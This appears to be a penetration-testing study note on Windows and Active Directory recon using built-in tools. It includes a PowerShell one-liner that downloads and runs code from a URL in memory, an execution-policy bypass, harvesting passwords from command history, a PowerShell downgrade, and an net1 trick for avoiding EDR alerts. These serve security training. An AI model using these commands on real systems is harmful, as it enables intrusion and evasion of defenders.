# Living Off the Land

## Env Commands For Host & Network Recon

**Basic Enumeration Commands**

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

**Basic Enumeration**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FZXJnrPIQMl6vEF1hAtHq%2Fimage.png?alt=media&amp;token=cde5a824-8016-433e-a7f8-70e940bd8a4b" alt=""><figcaption></figcaption></figure>

**Systeminfo**

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fs7C7uiJ8r2wK4awSnLyf%2Fimage.png?alt=media&amp;token=b801ef89-0610-4fa9-b866-1b9cd7541f07" alt=""><figcaption></figcaption></figure>

### Harnessing PowerShell

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

### **Quick Checks Using PowerShell**

```powershell-session
PS C:\htb> Get-Module
PS C:\htb> Get-ExecutionPolicy -List
PS C:\htb> whoami
PS C:\htb> Get-ChildItem Env: | ft key,value
```

### Downgrade Powershell

```powershell-session
PS C:\htb> Get-host
PS C:\htb> powershell.exe -version 2
PS C:\htb> Get-host
PS C:\htb> get-module
```

## Checking Defenses

### **Firewall Checks**

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```

### **Windows Defender Check (from CMD.exe)**

```cmd-session
C:\htb> sc query windefend
```

### Get-MpComputerStatus

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

### Using qwinsta

```powershell-session
PS C:\htb> qwinsta
```

### Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

### Using arp -a

```powershell-session
PS C:\htb> arp -a
```

### Viewing the Routing Table

```powershell-session
PS C:\htb> route print
```

## Windows Management Instrumentation (WMI)

* <https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4>

**Quick WMI checks**

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

```powershell-session
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

## Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

* Local and domain users
* Groups
* Hosts
* Specific users in groups
* Domain Controllers
* Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.

### **Table of Useful Net Commands**

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | ##List of PCs of the domain                                                                                                  |

### **Listing Domain Groups**

```powershell-session
PS C:\htb> net group /domain
```

### Information about a Domain User

```powershell-session
PS C:\htb> net user /domain wrouse
```

### **Net Commands Trick**

Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fb1ejfZXt2dp0pebCKPwW%2Fimage.png?alt=media&amp;token=ad832ed7-0979-4ef1-b56c-77f0c19c07ee" alt=""><figcaption></figcaption></figure>

## Dsquery

### **Dsquery DLL**

### User Search

```powershell-session
PS C:\htb> dsquery user
```

### **Computer Search**

```powershell-session
PS C:\htb> dsquery computer
```

### Wildcard Search

```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

### Users With Specific Attributes Set (PASSWD\_NOTREQD)

```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

### Searching for Domain Controllers

```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
